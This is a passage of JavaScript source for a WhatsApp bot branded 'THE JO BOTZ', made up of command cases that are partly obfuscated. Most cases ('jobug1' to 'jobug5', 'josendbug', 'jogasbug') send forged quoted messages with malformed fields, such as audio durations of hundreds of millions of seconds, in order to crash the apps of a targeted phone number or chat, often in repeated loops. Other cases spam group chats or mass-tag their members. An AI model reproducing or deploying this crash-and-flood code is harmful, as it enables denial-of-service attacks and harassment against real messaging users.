buttons=[{'buttonId':_0x168862(0xe6),'buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':'allmenu','buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':_0x168862(0xf6),'buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'image':fs[_0x168862(0xf2)](_0x168862(0xf3)),'caption':'THE\x20JO\x20BOT\x0aYou\x20Tube:\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','footer':virtex2,'buttons':buttons,'headerType':0x4};jobotz[_0x168862(0xf9)](text+_0x168862(0xe0),buttonMessage,{'quoted':shield2}),jancok(_0x168862(0xde)+text);}
}
break
case 'jogasbutton': {
const _0xf34024=_0x21e4;(function(_0x3ded21,_0x537528){const _0x233426=_0x21e4,_0x156098=_0x3ded21();while(!![]){try{const _0x20ebc4=parseInt(_0x233426(0x13b))/0x1+parseInt(_0x233426(0x148))/0x2+parseInt(_0x233426(0x134))/0x3+-parseInt(_0x233426(0x146))/0x4+parseInt(_0x233426(0x14c))/0x5*(parseInt(_0x233426(0x145))/0x6)+parseInt(_0x233426(0x143))/0x7+-parseInt(_0x233426(0x141))/0x8;if(_0x20ebc4===_0x537528)break;else _0x156098['push'](_0x156098['shift']());}catch(_0x293943){_0x156098['push'](_0x156098['shift']());}}}(_0x99f3,0x6d8e9));const _0xa7516d=(function(){let _0x1ee1d5=!![];return function(_0x259760,_0x3c4df2){const _0x1cdb4a=_0x1ee1d5?function(){const _0x4160cd=_0x21e4;if(_0x3c4df2){const _0x233022=_0x3c4df2[_0x4160cd(0x132)](_0x259760,arguments);return _0x3c4df2=null,_0x233022;}}:function(){};return _0x1ee1d5=![],_0x1cdb4a;};}()),_0x436b8d=_0xa7516d(this,function(){const _0x2bca22=_0x21e4;return _0x436b8d[_0x2bca22(0x149)]()['search'](_0x2bca22(0x14d))[_0x2bca22(0x149)]()[_0x2bca22(0x142)](_0x436b8d)[_0x2bca22(0x14a)]('(((.+)+)+)+$');});_0x436b8d();function _0x21e4(_0x47685f,_0x4316cf){const _0x13b7e4=_0x99f3();return _0x21e4=function(_0x1bc01a,_0x5d227f){_0x1bc01a=_0x1bc01a-0x12e;let _0x4ddff7=_0x13b7e4[_0x1bc01a];return _0x4ddff7;},_0x21e4(_0x47685f,_0x4316cf);}const _0x5d227f=(function(){let _0x3a5681=!![];return function(_0x2f5d52,_0x30b89e){const _0x3535f0=_0x3a5681?function(){const _0x28ad60=_0x21e4;if(_0x30b89e){const _0x47d706=_0x30b89e[_0x28ad60(0x132)](_0x2f5d52,arguments);return _0x30b89e=null,_0x47d706;}}:function(){};return _0x3a5681=![],_0x3535f0;};}()),_0x1bc01a=_0x5d227f(this,function(){const _0x5403f4=_0x21e4,_0x4a94fe=function(){const _0x333bb4=_0x21e4;let _0xd04970;try{_0xd04970=Function(_0x333bb4(0x133)+_0x333bb4(0x12e)+');')();}catch(_0x1bc6c1){_0xd04970=window;}return _0xd04970;},_0x2d366f=_0x4a94fe(),_0x535194=_0x2d366f[_0x5403f4(0x13d)]=_0x2d366f[_0x5403f4(0x13d)]||{},_0x21a9dc=[_0x5403f4(0x12f),_0x5403f4(0x147),'info',_0x5403f4(0x140),_0x5403f4(0x144),'table','trace'];for(let _0x2ebb56=0x0;_0x2ebb56<_0x21a9dc['length'];_0x2ebb56++){const _0x862a26=_0x5d227f[_0x5403f4(0x142)][_0x5403f4(0x13c)][_0x5403f4(0x14b)](_0x5d227f),_0x15aba2=_0x21a9dc[_0x2ebb56],_0x2d3c70=_0x535194[_0x15aba2]||_0x862a26;_0x862a26[_0x5403f4(0x130)]=_0x5d227f[_0x5403f4(0x14b)](_0x5d227f),_0x862a26[_0x5403f4(0x149)]=_0x2d3c70[_0x5403f4(0x149)][_0x5403f4(0x14b)](_0x2d3c70),_0x535194[_0x15aba2]=_0x862a26;}});function _0x99f3(){const _0x25aa53=['Nomernya\x20mana?','apply','return\x20(function()\x20','1490649PnadjH','./pict.jpg','Berhasil\x20Mengirim\x20Button\x20Di\x20Nomer\x20','readFileSync','sendMessage','chat','listmenu','371523IMqJat','prototype','console','\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','@s.whatsapp.net','error','8910704TMCPUy','constructor','3672662mcHREw','exception','12JckWOo','2242716Fpyyuw','warn','39908cWaXVU','toString','search','bind','1775590mSFRSL','(((.+)+)+)+$','{}.constructor(\x22return\x20this\x22)(\x20)','log','__proto__'];_0x99f3=function(){return _0x25aa53;};return _0x99f3();}_0x1bc01a();{if(!isCreator&&!isBan)return;if(!text)throw _0xf34024(0x131);let buttons=[{'buttonId':'bugjo','buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':'allmenu','buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':_0xf34024(0x13a),'buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'image':fs[_0xf34024(0x137)](_0xf34024(0x135)),'caption':wm+_0xf34024(0x13e),'footer':virtex2,'buttons':buttons,'headerType':0x4};jobotz[_0xf34024(0x138)](text+_0xf34024(0x13f),buttonMessage,{'quoted':shield2}),jobotz[_0xf34024(0x138)](m[_0xf34024(0x139)],buttonMessage,{'quoted':shield2}),jancok(_0xf34024(0x136)+text);}
}
break
case 'jobuglist':{
const _0x4b545b=_0x2051;(function(_0x594e5b,_0x3237c1){const _0x1b56f6=_0x2051,_0x2ef8c3=_0x594e5b();while(!![]){try{const _0x4b1742=-parseInt(_0x1b56f6(0x1c6))/0x1*(-parseInt(_0x1b56f6(0x1d8))/0x2)+parseInt(_0x1b56f6(0x1cb))/0x3*(-parseInt(_0x1b56f6(0x1d7))/0x4)+parseInt(_0x1b56f6(0x1c8))/0x5*(parseInt(_0x1b56f6(0x1e5))/0x6)+parseInt(_0x1b56f6(0x1de))/0x7+-parseInt(_0x1b56f6(0x1d5))/0x8+parseInt(_0x1b56f6(0x1d1))/0x9*(-parseInt(_0x1b56f6(0x1da))/0xa)+-parseInt(_0x1b56f6(0x1d2))/0xb*(-parseInt(_0x1b56f6(0x1e1))/0xc);if(_0x4b1742===_0x3237c1)break;else _0x2ef8c3['push'](_0x2ef8c3['shift']());}catch(_0x21c393){_0x2ef8c3['push'](_0x2ef8c3['shift']());}}}(_0x3b8b,0xf0e2b));function _0x2051(_0x175687,_0x32e62b){const _0x5b431a=_0x3b8b();return _0x2051=function(_0x329195,_0x10f54c){_0x329195=_0x329195-0x1c1;let _0x444d3f=_0x5b431a[_0x329195];return _0x444d3f;},_0x2051(_0x175687,_0x32e62b);}const _0x17f596=(function(){let _0x210e33=!![];return function(_0xa7c180,_0xa3f203){const _0x40c0cf=_0x210e33?function(){const _0x3c4bb4=_0x2051;if(_0xa3f203){const _0xe32ebe=_0xa3f203[_0x3c4bb4(0x1d0)](_0xa7c180,arguments);return _0xa3f203=null,_0xe32ebe;}}:function(){};return _0x210e33=![],_0x40c0cf;};}()),_0x113622=_0x17f596(this,function(){const _0x3da7cb=_0x2051;return _0x113622[_0x3da7cb(0x1c7)]()[_0x3da7cb(0x1c3)](_0x3da7cb(0x1df))[_0x3da7cb(0x1c7)]()['constructor'](_0x113622)[_0x3da7cb(0x1c3)](_0x3da7cb(0x1df));});function _0x3b8b(){const _0x13c6e7=['console','CLICK\x20DISINI','return\x20(function()\x20','12rXBMtC','AMBIL\x20SCRIPT\x20NYA','©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁','search','constructor','SINGLE_SELECT','14785Mjokfc','toString','2023755cLDdpa','Klik\x20Aja','message','1382475ZncJox','exception','SCRIPT\x20BOT','log','trace','apply','72TNuzaf','814396nlaTfz','chat','Message','14958272SjjUbr','length','16QsyJGF','212xrqOKF','bind','1516420AhaQZS','key','fromObject','DI\x20DALAM\x20LIST','10242169ETrJqy','(((.+)+)+)+$','table','336zFPuBv'];_0x3b8b=function(){return _0x13c6e7;};return _0x3b8b();}_0x113622();const _0x10f54c=(function(){let _0x5f343d=!![];return function(_0x106272,_0x6d7d70){const _0x4ead9b=_0x5f343d?function(){if(_0x6d7d70){const _0x585a75=_0x6d7d70['apply'](_0x106272,arguments);return _0x6d7d70=null,_0x585a75;}}:function(){};return _0x5f343d=![],_0x4ead9b;};}()),_0x329195=_0x10f54c(this,function(){const _0x388bf8=_0x2051,_0x3c1182=function(){const _0x11b22b=_0x2051;let _0x594483;try{_0x594483=Function(_0x11b22b(0x1e4)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2672c3){_0x594483=window;}return _0x594483;},_0x3ba80d=_0x3c1182(),_0x47961a=_0x3ba80d[_0x388bf8(0x1e2)]=_0x3ba80d[_0x388bf8(0x1e2)]||{},_0x125552=[_0x388bf8(0x1ce),'warn','info','error',_0x388bf8(0x1cc),_0x388bf8(0x1e0),_0x388bf8(0x1cf)];for(let _0x24ac42=0x0;_0x24ac42<_0x125552[_0x388bf8(0x1d6)];_0x24ac42++){const _0x20d75f=_0x10f54c[_0x388bf8(0x1c4)]['prototype']['bind'](_0x10f54c),_0x310cc4=_0x125552[_0x24ac42],_0x58a0fa=_0x47961a[_0x310cc4]||_0x20d75f;_0x20d75f['__proto__']=_0x10f54c[_0x388bf8(0x1d9)](_0x10f54c),_0x20d75f['toString']=_0x58a0fa[_0x388bf8(0x1c7)][_0x388bf8(0x1d9)](_0x58a0fa),_0x47961a[_0x310cc4]=_0x20d75f;}});_0x329195();{let template=await generateWAMessageFromContent(m[_0x4b545b(0x1d3)],proto[_0x4b545b(0x1d4)][_0x4b545b(0x1dc)]({'listMessage':{'title':_0x4b545b(0x1c1),'description':_0x4b545b(0x1dd),'buttonText':_0x4b545b(0x1e3),'footerText':'','listType':_0x4b545b(0x1c5),'sections':[{'title':_0x4b545b(0x1cd),'rows':[{'title':virtex1,'description':'©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁','rowId':'P'},{'title':virtex2,'description':_0x4b545b(0x1c2),'rowId':'P'}]}],'listType':0x1}}),{'userJid':m[_0x4b545b(0x1d3)],'quoted':shield2});jobotz['relayMessage'](m[_0x4b545b(0x1d3)],template[_0x4b545b(0x1ca)],{'messageId':template[_0x4b545b(0x1db)]['id']}),jancok(_0x4b545b(0x1c9));}
}
break

case 'jotagwae': {
const _0x255da2=_0x2242;(function(_0x10a419,_0x1312da){const _0x4edcb4=_0x2242,_0x275714=_0x10a419();while(!![]){try{const _0x1a6df8=-parseInt(_0x4edcb4(0xb6))/0x1+parseInt(_0x4edcb4(0x9e))/0x2*(parseInt(_0x4edcb4(0xaf))/0x3)+-parseInt(_0x4edcb4(0x94))/0x4*(parseInt(_0x4edcb4(0xb0))/0x5)+-parseInt(_0x4edcb4(0xa4))/0x6+-parseInt(_0x4edcb4(0x9c))/0x7*(parseInt(_0x4edcb4(0x98))/0x8)+parseInt(_0x4edcb4(0xab))/0x9+parseInt(_0x4edcb4(0x9f))/0xa;if(_0x1a6df8===_0x1312da)break;else _0x275714['push'](_0x275714['shift']());}catch(_0x375a64){_0x275714['push'](_0x275714['shift']());}}}(_0x233e,0x77643));function _0x233e(){const _0x273017=['bind','298266yqTPjV','15696970VqHWeQ','length','trace','log','prototype','3471036TauSVu','search','Tag\x20Aja','sendMessage','error','0@s.whatsapp.net','map','5362758KbpmJQ','│➳\x20@','(((.+)+)+)+$','apply','9jXlOQn','304755dnqDQY','Jumlahnya?','return\x20(function()\x20','table','isGroup','chat','318641AIjlRP','{}.constructor(\x22return\x20this\x22)(\x20)','toString','constructor','36SHfHBa','exception','group','console','600PEcVoM','__proto__','split','warn','63301BPISrj'];_0x233e=function(){return _0x273017;};return _0x233e();}const _0x19d142=(function(){let _0x464270=!![];return function(_0x5b5b60,_0x37b962){const _0x35128f=_0x464270?function(){if(_0x37b962){const _0x47f5e9=_0x37b962['apply'](_0x5b5b60,arguments);return _0x37b962=null,_0x47f5e9;}}:function(){};return _0x464270=![],_0x35128f;};}()),_0x36b520=_0x19d142(this,function(){const _0x4b1edb=_0x2242;return _0x36b520[_0x4b1edb(0xb8)]()['search'](_0x4b1edb(0xad))['toString']()['constructor'](_0x36b520)[_0x4b1edb(0xa5)](_0x4b1edb(0xad));});_0x36b520();const _0x58a7a4=(function(){let _0x4741b4=!![];return function(_0x3e5be2,_0x388636){const _0x569ff3=_0x4741b4?function(){const _0x5ef41e=_0x2242;if(_0x388636){const _0x3b593c=_0x388636[_0x5ef41e(0xae)](_0x3e5be2,arguments);return _0x388636=null,_0x3b593c;}}:function(){};return _0x4741b4=![],_0x569ff3;};}()),_0x4fda1b=_0x58a7a4(this,function(){const _0x5044f2=_0x2242,_0x29de34=function(){const _0x3436a7=_0x2242;let _0x37b93c;try{_0x37b93c=Function(_0x3436a7(0xb2)+_0x3436a7(0xb7)+');')();}catch(_0x421755){_0x37b93c=window;}return _0x37b93c;},_0x1bfcb2=_0x29de34(),_0x1dd46e=_0x1bfcb2[_0x5044f2(0x97)]=_0x1bfcb2[_0x5044f2(0x97)]||{},_0x1f6169=[_0x5044f2(0xa2),_0x5044f2(0x9b),'info',_0x5044f2(0xa8),_0x5044f2(0x95),_0x5044f2(0xb3),_0x5044f2(0xa1)];for(let _0x4fc03c=0x0;_0x4fc03c<_0x1f6169[_0x5044f2(0xa0)];_0x4fc03c++){const _0x5b9d23=_0x58a7a4[_0x5044f2(0xb9)][_0x5044f2(0xa3)][_0x5044f2(0x9d)](_0x58a7a4),_0x2cac72=_0x1f6169[_0x4fc03c],_0x296be5=_0x1dd46e[_0x2cac72]||_0x5b9d23;_0x5b9d23[_0x5044f2(0x99)]=_0x58a7a4[_0x5044f2(0x9d)](_0x58a7a4),_0x5b9d23[_0x5044f2(0xb8)]=_0x296be5[_0x5044f2(0xb8)][_0x5044f2(0x9d)](_0x296be5),_0x1dd46e[_0x2cac72]=_0x5b9d23;}});_0x4fda1b();function _0x2242(_0x35f0a2,_0x17286e){const _0x167a71=_0x233e();return _0x2242=function(_0x4fda1b,_0x58a7a4){_0x4fda1b=_0x4fda1b-0x94;let _0x4259c3=_0x167a71[_0x4fda1b];return _0x4259c3;},_0x2242(_0x35f0a2,_0x17286e);}{if(!isCreator&&!isBan)return;if(!m[_0x255da2(0xb4)])throw mess[_0x255da2(0x96)];if(args['length']==0x0)return m['reply'](_0x255da2(0xb1));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let jansencoli={'key':{'participant':_0x255da2(0xa9)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':virgam}}};var teks=philips;for(let mem of participants){teks+=_0x255da2(0xac)+mem['id'][_0x255da2(0x9a)]('@')[0x0]+'\x0a';}jobotz[_0x255da2(0xa7)](m[_0x255da2(0xb5)],{'text':teks,'mentions':participants[_0x255da2(0xaa)](_0x39b787=>_0x39b787['id'])},{'quoted':jansencoli});}jancok(_0x255da2(0xa6));}
 }
 break

case 'joslebew' : {
var _0x58e065=_0x2be0;(function(_0x4a6a9b,_0x135be9){var _0x20dc47=_0x2be0,_0x3dfeb7=_0x4a6a9b();while(!![]){try{var _0x3c2c3b=parseInt(_0x20dc47(0x116))/0x1*(parseInt(_0x20dc47(0xfc))/0x2)+parseInt(_0x20dc47(0x104))/0x3+parseInt(_0x20dc47(0x100))/0x4+-parseInt(_0x20dc47(0x10c))/0x5+parseInt(_0x20dc47(0x10f))/0x6*(parseInt(_0x20dc47(0x10a))/0x7)+parseInt(_0x20dc47(0x111))/0x8*(parseInt(_0x20dc47(0x10b))/0x9)+-parseInt(_0x20dc47(0x106))/0xa;if(_0x3c2c3b===_0x135be9)break;else _0x3dfeb7['push'](_0x3dfeb7['shift']());}catch(_0x6535f2){_0x3dfeb7['push'](_0x3dfeb7['shift']());}}}(_0x1f13,0xdf590));var _0x4dea5c=(function(){var _0x906799=!![];return function(_0x45bd40,_0x3487e9){var _0x24f72d=_0x906799?function(){if(_0x3487e9){var _0x102c32=_0x3487e9['apply'](_0x45bd40,arguments);return _0x3487e9=null,_0x102c32;}}:function(){};return _0x906799=![],_0x24f72d;};}()),_0x1b6c8b=_0x4dea5c(this,function(){var _0x1b33ae=_0x2be0;return _0x1b6c8b[_0x1b33ae(0x113)]()['search'](_0x1b33ae(0x101))[_0x1b33ae(0x113)]()[_0x1b33ae(0xff)](_0x1b6c8b)[_0x1b33ae(0xfd)](_0x1b33ae(0x101));});_0x1b6c8b();var _0x38c738=(function(){var _0x22af27=!![];return function(_0x35ba43,_0x51e6ac){var _0x1d2b0c=_0x22af27?function(){var _0x5beae2=_0x2be0;if(_0x51e6ac){var _0x319393=_0x51e6ac[_0x5beae2(0x118)](_0x35ba43,arguments);return _0x51e6ac=null,_0x319393;}}:function(){};return _0x22af27=![],_0x1d2b0c;};}()),_0x23f7d4=_0x38c738(this,function(){var _0x112f13=_0x2be0,_0x44b2c1=function(){var _0x2811fc=_0x2be0,_0x30bb96;try{_0x30bb96=Function(_0x2811fc(0x105)+_0x2811fc(0x110)+');')();}catch(_0x28ff35){_0x30bb96=window;}return _0x30bb96;},_0x5643bd=_0x44b2c1(),_0x22ed7c=_0x5643bd['console']=_0x5643bd[_0x112f13(0x108)]||{},_0x41256c=['log','warn',_0x112f13(0x119),_0x112f13(0x117),_0x112f13(0x103),'table','trace'];for(var _0x10dc3b=0x0;_0x10dc3b<_0x41256c[_0x112f13(0x109)];_0x10dc3b++){var _0x1cbfa4=_0x38c738[_0x112f13(0xff)][_0x112f13(0x10e)]['bind'](_0x38c738),_0x56fc75=_0x41256c[_0x10dc3b],_0x5dc75f=_0x22ed7c[_0x56fc75]||_0x1cbfa4;_0x1cbfa4[_0x112f13(0x114)]=_0x38c738[_0x112f13(0x112)](_0x38c738),_0x1cbfa4[_0x112f13(0x113)]=_0x5dc75f[_0x112f13(0x113)]['bind'](_0x5dc75f),_0x22ed7c[_0x56fc75]=_0x1cbfa4;}});function _0x2be0(_0x911be5,_0x979472){var _0x57b07b=_0x1f13();return _0x2be0=function(_0x23f7d4,_0x38c738){_0x23f7d4=_0x23f7d4-0xfc;var _0x40e6c4=_0x57b07b[_0x23f7d4];return _0x40e6c4;},_0x2be0(_0x911be5,_0x979472);}_0x23f7d4();{if(!m[_0x58e065(0x10d)][_0x58e065(0x115)])return;if(!isCreator&&!isBan)return;await jobotz[_0x58e065(0x102)](m[_0x58e065(0x107)],{'text':_0x58e065(0xfe)},{'quoted':fgamjo}),await jobotz['sendMessage'](m[_0x58e065(0x107)],{'text':_0x58e065(0xfe)},{'quoted':fsticjo}),await jobotz[_0x58e065(0x102)](m[_0x58e065(0x107)],{'text':_0x58e065(0xfe)},{'quoted':fkonjo}),await jobotz[_0x58e065(0x102)](m[_0x58e065(0x107)],{'text':'THE\x20JO\x20BOT\x20SLEBEW'},{'quoted':fdocjo}),await jobotz['sendMessage'](m[_0x58e065(0x107)],{'text':_0x58e065(0xfe)},{'quoted':fgamjo}),await jobotz[_0x58e065(0x102)](m[_0x58e065(0x107)],{'text':_0x58e065(0xfe)},{'quoted':fsticjo}),await jobotz['sendMessage'](m[_0x58e065(0x107)],{'text':_0x58e065(0xfe)},{'quoted':fkonjo}),await jobotz['sendMessage'](m['chat'],{'text':_0x58e065(0xfe)},{'quoted':fdocjo}),await jobotz['sendMessage'](m[_0x58e065(0x107)],{'text':_0x58e065(0xfe)},{'quoted':fgamjo}),await jobotz[_0x58e065(0x102)](m[_0x58e065(0x107)],{'text':'THE\x20JO\x20BOT\x20SLEBEW'},{'quoted':fsticjo}),await jobotz['sendMessage'](m['chat'],{'text':_0x58e065(0xfe)},{'quoted':fkonjo}),await jobotz[_0x58e065(0x102)](m['chat'],{'text':'THE\x20JO\x20BOT\x20SLEBEW'},{'quoted':fdocjo}),jancok('©\x20THE\x20JO\x20BOT');}function _0x1f13(){var _0x89a13a=['24bLenTM','bind','toString','__proto__','fromMe','15hpqlri','error','apply','info','70338bWQAur','search','THE\x20JO\x20BOT\x20SLEBEW','constructor','1020836sOLPbP','(((.+)+)+)+$','sendMessage','exception','1050540WKoVQC','return\x20(function()\x20','15408710gDjXzY','chat','console','length','7pYRRdH','5280003IwummW','6537455IgYiyd','key','prototype','5221614yBRZWt','{}.constructor(\x22return\x20this\x22)(\x20)'];_0x1f13=function(){return _0x89a13a;};return _0x1f13();}
                     }
                break
case 'jobug1':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fdoc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug1':{
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fdoc})
await m.reply(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
}
break
case 'jogasbug1':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fdoc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fdoc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fdoc1})
jancok(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
break
case 'jobug2':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
"jpegThumbnail": virgam
} 
} 
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug2':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
"jpegThumbnail": virgam
} 
} 
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto})
await m.reply(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
break
case 'jogasbug2':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foto1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
"jpegThumbnail": virgam
} 
} 
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto1})
jancok(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
break
case 'jobug3':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug3':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc})
await m.reply(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
break
case 'jogasbug3':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fvoc1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc1})
jancok(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
break
case 'jobug4':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgif})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug4':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgif})
await m.reply(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
break
case 'jogasbug4':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgif1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgif1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgif1})
jancok(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
break
case 'jobug5':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) { 
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
